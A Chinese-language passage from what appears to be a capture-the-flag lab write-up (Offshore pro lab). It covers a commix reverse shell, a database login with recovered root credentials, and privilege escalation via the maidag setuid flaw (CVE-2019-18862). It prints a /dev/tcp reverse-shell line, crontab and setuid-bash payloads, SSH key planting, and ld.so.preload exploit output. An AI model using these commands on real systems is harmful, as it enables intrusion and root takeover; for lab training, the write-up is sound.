                                <th class="column1">Transaction ID</th>                                                                                                                                                                                                                                                                                                                                                                  
                                <th class="column2">From</th>                                                                                                                                                                                                                                                                                                                                                                            
                                <th class="column3">To</th>                                                                                                                                                                                                                                                                                                                                                                              
                                <th class="column4">Amount</th>                                                                                                                                                                                                                                                                                                                                                                          
                                <th class="column5">Currency</th>                                                                                                                                                                                                                                                                                                                                                                        
                            </tr>                                                                                                                                                                                                                                                                                                                                                                                                        
                        </thead>                                                                                                                                                                                                                                                                                                                                                                                                         
                        <tbody>                                                                                                                                                                                                                                                                                                                                                                                                          
<?php                                                                                                                                                                                                                                                                                                                                                                                                                                    
    while($row = $result->fetch_assoc()) {                                                                                                                                                                                                                                                                                                                                                                                               
        echo "<tr><td class='column1'>" . $row['transactionID'] . "</td>                                                                                                                                                                                                                                                                                                                                                                 
              <td class='column2'>" . $row['fromaddr'] . "</td>                                                                                                                                                                                                                                                                                                                                                                          
              <td class='column3'>" . $row['toaddr'] . "</td>                                                                                                                                                                                                                                                                                                                                                                            
              <td class='column4'>" . $row['amount'] . "</td>                                                                                                                                                                                                                                                                                                                                                                            
              <td class='column5'>" . $row['currency'] . "</td></tr>";                                                                                                                                                                                                                                                                                                                                                                   
    }                                                                                                                                                                                                                                                                                                                                                                                                                                    
} else {                                                                                                                                                                                                                                                                                                                                                                                                                                 
    echo "0 results";                                                                                                                                                                                                                                                                                                                                                                                                                    
}                                                                                                                                                                                                                                                                                                                                                                                                                                        
$conn->close();                                                                                                                                                                                                                                                                                                                                                                                                                          
?>                                                                                                                                                                                                                                                                                                                                                                                                                                       
                            </tr>                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                                         
                        </tbody>                                                                                                                                                                                                                                                                                                                                                                                                         
                    </table>                                                                                                                                                                                                                                                                                                                                                                                                             
                </div>                                                                                                                                                                                                                                                                                                                                                                                                                   
            </div>                                                                                                                                                                                                                                                                                                                                                                                                                       
        </section>                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                         
        <script src="vendor/jquery/jquery-3.2.1.min.js"></script>                                                                                                                                                                                                                                                                                                                                                                        
        <!--===============================================================================================-->                                                                                                                                                                                                                                                                                                                           
        <script src="vendor/bootstrap/js/popper.js"></script>                                                                                                                                                                                                                                                                                                                                                                            
        <script src="vendor/bootstrap/js/bootstrap.min.js"></script>                                                                                                                                                                                                                                                                                                                                                                     
        <!--===============================================================================================-->                                                                                                                                                                                                                                                                                                                           
        <script src="vendor/select2/select2.min.js"></script>                                                                                                                                                                                                                                                                                                                                                                            
        <!--===============================================================================================-->                                                                                                                                                                                                                                                                                                                           
        <script src="js/main.js"></script>                                                                                                                                                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                                                                                                                                                                         
        <!-- partial -->                                                                                                                                                                                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                                                                                                                                                                         
    </body>                                                                                                                                                                                                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                                                                                                                                                                                                                         
</html>      
```

得到root/toor数据库凭据

## 反弹shell
使用自带的反弹shell功能

```c
commix(os_shell) > reverse_tcp
commix(reverse_tcp) > set LHOST 10.10.16.2
LHOST => 10.10.16.2
commix(reverse_tcp) > set LPORT 6666
LPORT => 6666
Available reverse TCP shell options:
 * Type '1' for netcat reverse TCP shells.
 * Type '2' for other reverse TCP shells.
commix(reverse_tcp_other) > 1
[12:46:02] [info] Sending payload to target, for reverse TCP connection on 10.10.16.2:6666.
```

```c
┌──(kali㉿kali)-[~/Desktop/tools/commix-4.1]
└─$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.110.3] 22508
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## Mysql
```c
$ mysql -u root -p
mysql -u root -p
Enter password: toor

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 14
Server version: 5.7.42-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

## Getflag
```c
mysql> SHOW DATABASES; 
SHOW DATABASES; 
+--------------------+
| Database           |
+--------------------+
| information_schema |
| bank_db            |
| flag               |
| mysql              |
| offshore           |
| performance_schema |
| sys                |
| transactionsDB     |
+--------------------+
8 rows in set (0.00 sec)

mysql> use flag;
use flag;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+----------------+
| Tables_in_flag |
+----------------+
| gameover       |
+----------------+
1 row in set (0.00 sec)

mysql> select * from gameover;
select * from gameover;
+------------------------------------+
| flag_value                         |
+------------------------------------+
| OFFSHORE{3ncrypt10n_w0rk$_w0nd3rs} |
+------------------------------------+
1 row in set (0.00 sec)
```

得到flag OFFSHORE{3ncrypt10n_w0rk$_w0nd3rs}

## 提权
### SUID
```c
$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/local/sbin/maidag
/usr/local/bin/sudo
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/bin/ping
/bin/mount
/bin/umount
/bin/fusermount
/bin/su
```

### Maidag
```c
$ /usr/local/sbin/maidag --version
/usr/local/sbin/maidag --version
maidag (GNU Mailutils) 3.7
Copyright (C) 2007-2019 Free Software Foundation, inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

![](/image/prolabs/Offshore-94.png)

### Description
```c
# Exploit Title: GNU Mailutils 3.7 - Local Privilege Escalation
# Date: 2019-11-06
# Exploit Author: Mike Gualtieri
# Vendor Homepage: https://mailutils.org/
# Software Link: https://ftp.gnu.org/gnu/mailutils/mailutils-3.7.tar.gz
# Version: 2.0 <= 3.7
# Tested on: Gentoo
# CVE : CVE-2019-18862

Title   : GNU Mailutils / Maidag Local Privilege Escalation
Author  : Mike Gualtieri :: https://www.mike-gualtieri.com
Date    : 2019-11-06
Updated : 2019-11-20

Vendor Affected:   GNU Mailutils :: https://mailutils.org/
Versions Affected: 2.0 - 3.7
CVE Designator:    CVE-2019-18862


1. Overview

The --url parameter included in the GNU Mailutils maidag utility (versions 2.0
through 3.7) can abused to write to arbitrary files on the host operating
system.  By default, maidag is set to execute with setuid root permissions,
which can lead to local privilege escalation through code/command execution by
writing to the system's crontab or by writing to other root owned files on the
operating system.



2. Detail

As described by the project's homepage, "GNU Mailutils is a swiss army knife of 
electronic mail handling. It offers a rich set of utilities and daemons for
processing e-mail".

Maidag, a mail delivery agent utility included in the suite, is by default
marked to execute with setuid (suid) root permissions.

The --url parameter of maidag can be abused to write to arbitrary files on the 
operating system.  Abusing this option while the binary is marked with suid 
permissions allows a low privileged user to write to arbitrary files on the 
system as root.  Writing to the crontab, for example, may lead to a root shell.

The flaw itself appears to date back to the 2008-10-19 commit, when the --url 
parameter was introduced to maidag.

	11637b0f - New maidag mode: --url
	https://git.savannah.gnu.org/cgit/mailutils.git/commit/?id=11637b0f262db62b4dc466cefb9315098a1a995a

	maidag/Makefile.am:
    	chmod 4755 $(DESTDIR)$(sbindir)/$$i;\


The following payload will execute arbitrary commands as root and works with 
versions of maidag, through version 3.7.

	maidag  --url /etc/crontab < /tmp/crontab.in

	The file /tmp/crontab.in would contain a payload like the following.  

	line 1:
	line 2: */1  *  * * *  root    /tmp/payload.sh

	Please note: For the input to be accepted by maidag, the first line of the
    file must be blank or be commented.

	In the above example, the file /tmp/payload.sh would include arbitrary 
    commands to execute as root.


Older versions of GNU Mailutils (2.2 and previous) require a different syntax:

	maidag --url 'mbox://user@localhost //etc/crontab' < /tmp/crontab.in



3. Solution

A fix for the flaw has been made in GNU Mailutils 3.8, which removes the maidag 
utility, and includes three new utilities that replace its functionality.  
Details about the new features can be found in the project's release notes:

	https://git.savannah.gnu.org/cgit/mailutils.git/tree/NEWS

Another workaround for those unable to upgrade, is to remove the suid bit on 
/usr/sbin/maidag (e.g. `chmod u-s /usr/sbin/maidag`).

It should be noted that some Linux distributions already remove the suid bit
from maidag by default, nullifying this privilege escalation flaw.

Another patch has been made available by Sergey Poznyakoff and posted to the
GNU Mailutils mailing list, which removes the setuid bit for maidag in all but
required cases.  The patch is intended for users who can not yet upgrade to
mailutils 3.8.  The patch has also been made available here:
https://www.mike-gualtieri.com/files/maidag-dropsetuid.patch



4. Additional Comments

This vulnerability disclosure was submitted to MITRE Corporation for inclusion
in the Common Vulnerabilities and Exposures (CVE) database.  The designator
CVE-2019-18862 has been assigned.

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18862
https://nvd.nist.gov/vuln/detail/CVE-2019-18862

The NIST National Vulnerability Database (NVD) has assigned the following
ratings:

CVSS 3.x Severity and Metrics: Base Score: 7.8 HIGH
CVSS 2.0 Severity and Metrics: Base Score: 4.6 MEDIUM

This disclosure will be updated as new information becomes available.  



5. History

2019-10-09 Informed Sergey Poznyakoff <gray@gnu.org.ua> of security issue

2019-10-10 Reply from Sergey acknowledging the issue

2019-10-12 Fix available in the GNU Mailutils git repository:
           739c6ee5 - Split maidag into three single-purpose tools
           https://git.savannah.gnu.org/cgit/mailutils.git/commit/?id=739c6ee525a4f7bb76b8fe2bd75e81a122764ced

2019-11-06 GNU Mailutils Version 3.8 released to close the issue

2019-11-06 Submission of this vulnerability disclosure to MITRE Corporate to
           obtain a CVE designator

2019-11-07 Patch offered by Sergey for those unable to upgrade to version 3.8

2019-11-11 CVE-2019-18862 assigned to flaw

2019-11-20 Vulnerability disclosure made publicly available
```

[local-exploits/CVE-2019-18862/exploit.cron.sh at master · bcoles/exploit.ldpreload.sh](https://github.com/bcoles/local-exploits/tree/master/CVE-2019-18862)

[local-exploits/CVE-2019-18862/exploit.cron.sh at master · bcoles/local-exploits](https://github.com/bcoles/local-exploits/blob/master/CVE-2019-18862/exploit.cron.sh)

### Exp(失败)
 在本例中，我们将在 /dev/shm 目录中制作一个有效载荷

```c
echo '#!/bin/bash' > /tmp/rootme.sh
echo '' >> /tmp/rootme.sh
echo 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1' >> /tmp/rootme.sh
echo 'chmod +s /bin/bash' > /tmp/rootme.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/rootme.sh
```

好了，脚本已经制作好了，现在只需要设置执行权限即可。

```bash
chmod 755 /tmp/rootme.sh
```

接下来，我们需要创建 **crontab.in** 文件，将我们的恶意 cron 作业写入 crontab。

请注意，描述说要使此功能正常工作，请将 crontab.in 文件的第一行留空。

```bash
echo '' > crontab.in
echo '* * * * *       root    /tmp/rootme.sh' >> crontab.in
```

最后，我们准备运行 **maidag** 二进制文件并将恶意条目注入到 crontab 中。

```bash
/usr/local/sbin/maidag --url /etc/crontab < /tmp/crontab.in
```

运行 **maidag** 二进制文件后，我们可以看到它有效并且 crontab 已更新！

![](/image/prolabs/Offshore-95.png)

这将每分钟运行一次 cron 作业并执行我们以 root 身份创建的恶意 rootme.sh 脚本。

剩下要做的就是在我们的攻击者机器上启动一个 netcat 监听器，然后等待 root shell 进入。

结果发现没成功，原因是需要一个完整的shell

### 构建完整shell
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ ssh-keygen -f ~/Desktop/htb/offshore/key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in /home/kali/Desktop/htb/offshore/key
Your public key has been saved in /home/kali/Desktop/htb/offshore/key.pub
The key fingerprint is:
SHA256:QmkyVYMQhXLoFM4OOfCdpICV3eD7mnBkAabtaOk4hDA kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|+.===Booo        |
|oX=*+oo. .       |
|Eo*oB +          |
|oBo  B           |
|o+o + . S        |
|=  o . .         |
|o.. . .          |
| . o o           |
|    o            |
+----[SHA256]-----+
```

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ cat key.pub     
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPBJBQPs4xznWRBNU0kPtSDvCnVlTJLNh1GStErXb7oG kali@kali
```

```c
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPBJBQPs4xznWRBNU0kPtSDvCnVlTJLNh1GStErXb7oG kali@kali" >> /home/client_banking/.ssh/authorized_keys
```

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q ssh -i key client_banking@172.16.4.120                                         
The authenticity of host '172.16.4.120 (172.16.4.120)' can't be established.
ED25519 key fingerprint is: SHA256:jYtJ7MNOOj8jQjgNdzoalSlHtAGz6N9Bjp2+fXAOb7E
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.4.120' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
Last login: Wed Feb 26 02:06:03 2020 from 172.16.4.5
client_banking@NIX03:~$ 
```

### root
```c
client_banking@NIX03:/tmp$ chmod 777 exploit.ldpreload.sh 
client_banking@NIX03:/tmp$ ./exploit.ldpreload.sh 
[+] /usr/local/sbin/maidag is set-uid
[*] Compiling...
[*] Writing stub to /tmp/stub ...
[*] Adding /tmp/libmaidag.so to /etc/ld.so.preload...
-rw------- 1 root client_banking 124 Mar  9 22:40 /etc/ld.so.preload
[*] Wait for your shell to be set-uid root: /var/tmp/sh
[*] Spamming TCP connections to 127.0.0.1:25 ...
220 NIX03 ESMTP Postfix (Ubuntu)
221 2.0.0 Bye
220 NIX03 ESMTP Postfix (Ubuntu)
221 2.0.0 Bye
220 NIX03 ESMTP Postfix (Ubuntu)
221 2.0.0 Bye
220 NIX03 ESMTP Postfix (Ubuntu)
221 2.0.0 Bye
220 NIX03 ESMTP Postfix (Ubuntu)
221 2.0.0 Bye
220 NIX03 ESMTP Postfix (Ubuntu)
221 2.0.0 Bye
220 NIX03 ESMTP Postfix (Ubuntu)
221 2.0.0 Bye
220 NIX03 ESMTP Postfix (Ubuntu)
221 2.0.0 Bye
220 NIX03 ESMTP Postfix (Ubuntu)
221 2.0.0 Bye
220 NIX03 ESMTP Postfix (Ubuntu)
221 2.0.0 Bye
[+] Success:
-rwsrwxr-x 1 root root 8392 Mar  9 22:40 /var/tmp/sh
[*] Cleaning up ...
root@NIX03:/tmp# 
```

## Getflag
```c
root@NIX03:/tmp# cat /root/flag.txt
OFFSHORE{s3tuid_f0r_th3_k1ll_sh0t!}
```





